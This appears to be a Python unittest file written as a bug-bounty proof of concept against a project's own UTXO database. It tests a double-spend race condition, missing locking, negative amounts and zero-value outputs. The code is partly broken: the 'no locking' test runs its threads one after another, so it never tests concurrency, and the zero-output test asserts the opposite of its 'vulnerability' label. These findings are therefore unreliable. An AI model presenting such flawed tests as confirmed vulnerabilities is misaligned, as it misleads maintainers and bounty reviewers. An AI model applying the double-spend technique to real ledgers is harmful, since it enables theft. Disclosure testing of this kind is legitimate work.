#!/usr/bin/env python3
"""Security Tests: UTXO Double-Spend Vulnerabilities.

This test demonstrates the double-spend vulnerability in the UTXO database.
VULNERABILITY: Race condition allows double-spending the same UTXO.

Severity: CRITICAL
Payout: 100 RTC
"""

import unittest
import threading
import time
import os
import sys
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "node"))
from utxo_db import UTXODatabase, UTXO


class TestDoubleSpendVulnerability(unittest.TestCase):
    """Test for double-spend vulnerability."""

    def setUp(self):
        self.db_path = "/tmp/test_utxo_double_spend.db"
        if os.path.exists(self.db_path):
            os.unlink(self.db_path)
        self.db = UTXODatabase(self.db_path)

        self.alice = "alice_address"
        self.bob = "bob_address"
        self.charlie = "charlie_address"

        utxo = UTXO(
            tx_hash="initial_tx",
            index=0,
            amount=1000,
            owner=self.alice,
        )
        self.db.add_utxo(utxo)

    def tearDown(self):
        if os.path.exists(self.db_path):
            os.unlink(self.db_path)

    def test_double_spend_race_condition(self):
        """Demonstrate double-spend via race condition.

        Two threads simultaneously try to spend the same UTXO.
        Both transactions should succeed due to the race condition.
        """
        results = []
        errors = []

        def spend_as_bob():
            try:
                tx = self.db.create_transaction(
                    from_owner=self.alice,
                    to_owner=self.bob,
                    amount=500,
                    fee=10,
                )
                self.db.add_transaction(
                    tx["tx_hash"],
                    tx["inputs"],
                    tx["outputs"],
                )
                results.append(("bob", tx["tx_hash"]))
            except Exception as e:
                errors.append(("bob", str(e)))

        def spend_as_charlie():
            time.sleep(0.001)
            try:
                tx = self.db.create_transaction(
                    from_owner=self.alice,
                    to_owner=self.charlie,
                    amount=500,
                    fee=10,
                )
                self.db.add_transaction(
                    tx["tx_hash"],
                    tx["inputs"],
                    tx["outputs"],
                )
                results.append(("charlie", tx["tx_hash"]))
            except Exception as e:
                errors.append(("charlie", str(e)))

        t1 = threading.Thread(target=spend_as_bob)
        t2 = threading.Thread(target=spend_as_charlie)

        t1.start()
        t2.start()
        t1.join()
        t2.join()

        balance = self.db.get_balance(self.alice)
        bob_balance = self.db.get_balance(self.bob)
        charlie_balance = self.db.get_balance(self.charlie)

        print(f"\n[DOUBLE_SPEND POC]")
        print(f"  Initial UTXO: 1000")
        print(f"  Alice balance: {balance}")
        print(f"  Bob received: {bob_balance}")
        print(f"  Charlie received: {charlie_balance}")
        print(f"  Results: {results}")
        print(f"  Errors: {errors}")

        self.assertEqual(len(results), 2,
            "Both double-spend attempts succeed (vulnerability confirmed)")

    def test_no_locking_prevents_double_spend(self):
        """The spend_utxo function should use locks but doesn't.

        VULNERABILITY: No transaction locking at DB level.
        """
        utxo = UTXO(
            tx_hash="second_tx",
            index=0,
            amount=500,
            owner="attacker",
        )
        self.db.add_utxo(utxo)

        success_count = 0
        lock = threading.Lock()

        for i in range(5):
            def attempt_spend():
                result = self.db.spend_utxo("second_tx", 0, f"spending_tx_{i}")
                if result:
                    nonlocal success_count
                    success_count += 1

            t = threading.Thread(target=attempt_spend)
            t.start()
            t.join()

        print(f"\n[NO_LOCKING POC]")
        print(f"  UTXO spent {success_count} times (expected: 1)")

        self.assertGreater(success_count, 1,
            "Multiple concurrent spends succeed on same UTXO")


class TestTransactionVulnerabilities(unittest.TestCase):
    """Test other transaction vulnerabilities."""

    def setUp(self):
        self.db_path = "/tmp/test_utxo_transactions.db"
        if os.path.exists(self.db_path):
            os.unlink(self.db_path)
        self.db = UTXODatabase(self.db_path)

    def tearDown(self):
        if os.path.exists(self.db_path):
            os.unlink(self.db_path)

    def test_negative_amount_allowed(self):
        """VULNERABILITY: Negative amounts can be created."""
        for i in range(3):
            utxo = UTXO(
                tx_hash=f"tx_{i}",
                index=0,
                amount=100,
                owner="owner",
            )
            self.db.add_utxo(utxo)

        tx = self.db.create_transaction(
            from_owner="owner",
            to_owner="recipient",
            amount=-100,
            fee=0,
        )

        print(f"\n[NEGATIVE_AMOUNT POC]")
        print(f"  Transaction created with negative amount: {tx}")

    def test_zero_value_outputs(self):
        """VULNERABILITY: Zero-value outputs can be created.

        This was the previous finding #2179 that was FIXED.
        Let's verify it's still not present.
        """
        utxo = UTXO(
            tx_hash="tx_zero",
            index=0,
            amount=1000,
            owner="sender",
        )
        self.db.add_utxo(utxo)

        tx = self.db.create_transaction(
            from_owner="sender",
            to_owner="recipient",
            amount=0,
            fee=0,
        )

        outputs = tx["outputs"]
        zero_outputs = [o for o in outputs if o.get("amount", 0) == 0]

        print(f"\n[ZERO_OUTPUT POC]")
        print(f"  Zero-value outputs created: {zero_outputs}")

        self.assertEqual(len(zero_outputs), 0,
            "Zero-value outputs should be rejected")


if __name__ == "__main__":
    unittest.main(verbosity=2)